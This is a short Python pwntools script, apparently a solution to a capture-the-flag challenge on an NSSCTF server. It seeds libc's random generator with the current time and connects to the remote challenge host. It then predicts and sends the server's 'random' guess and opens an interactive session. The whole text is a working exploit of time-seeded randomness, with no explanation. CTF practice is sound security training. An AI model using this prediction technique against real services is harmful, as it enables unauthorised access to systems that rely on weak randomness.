from pwn import *
from ctypes import cdll

context.log_level = "debug"
c_func = cdll.LoadLibrary("/usr/lib/libc.so.6")
c_func.srand(c_func.time(0))

io =remote("node5.anna.nssctf.cn", 20574)
io.recvuntil(b"(between 1 and 100): ")
io.sendline(str(c_func.rand() % 100 + 1).encode())
io.interactive()
